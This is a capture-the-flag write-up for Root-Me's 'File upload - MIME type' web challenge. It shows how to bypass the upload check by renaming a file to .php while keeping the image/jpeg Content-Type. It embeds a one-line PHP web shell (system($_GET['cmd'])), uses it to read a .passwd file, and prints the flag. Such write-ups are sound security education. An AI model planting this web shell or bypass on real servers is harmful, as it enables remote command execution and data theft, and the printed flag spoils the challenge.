## Challenge name: File upload - MIME type


<img width="1385" height="342" alt="image" src="https://github.com/user-attachments/assets/bb2c2c81-34f8-40d3-8b62-29800e7eb384" />
<br>
<br>

``` Challenge Link:``` [https://www.root-me.org/en/Challenges/Web-Server/File-upload-MIME-type](https://www.root-me.org/en/Challenges/Web-Server/File-upload-MIME-type)
<br>
<br>

**After starting the challenge we can see a photo galery and we can upload images in it.**

<br>
<img width="1385" height="342" alt="image" src="https://github.com/user-attachments/assets/4f142d4f-21b5-44e1-a5f7-073b7fcca480" />
<br>
<br>

**We will open brupsuite to analyze request while we upload files and try to bypass the file upload logic and insted of image we will upload .php file to run arbitrary commands on server.**

<br>
<img width="1917" height="1237" alt="image" src="https://github.com/user-attachments/assets/c62a6f6f-b7b3-412a-ad7e-4a4ecd6752a7" />
<br>
<br>

**Up there in the picture we can see how normal request of uploading image so now we will change/modify the request and upload a .php file type..**
<br>
<br>
**From the original request we will change the file name form this** ``` filename="image.jpg" ``` **to this** ``` filename="image.php" ``` **because as the challenge suggests it only checks mime type** 
``` Content-Type: image/jpeg ```
<br><br>
**Also we will put this php code somewhere inside the image data..**

``` 
 <?php
 system($_GET["cmd"]);
 ?>
```

**Now our modyfied request look like this:**

<br>
<img width="1917" height="1237" alt="image" src="https://github.com/user-attachments/assets/e30bac23-8276-42fe-acb3-a0e359db3d75" />
<br>
<br>

**Its a success and file has been uploaded lets see it on site..**

<br>
<img width="1457" height="494" alt="image" src="https://github.com/user-attachments/assets/119d898d-3ecb-4940-87a7-b4844316fe4f" />
<br>
<br>

**We can see our image let's click on that.**

<br>
<img width="1457" height="494" alt="image" src="https://github.com/user-attachments/assets/c8f7ee2c-da5a-4502-aced-bb7b03d8896b" />
<br>
<br>

**We can see .passwd in users home folder so we will do cat to view its contents.**

<br>
<img width="1457" height="494" alt="image" src="https://github.com/user-attachments/assets/49fcb4a8-bd90-4c0b-8ee1-5472026ef243" />
<br>
<br>

**Yep we got our flag/passwd as "a7n4nizpgQgnPERy89uanf6T4" we can use this to solve the challenge.**

**Thankyou.**
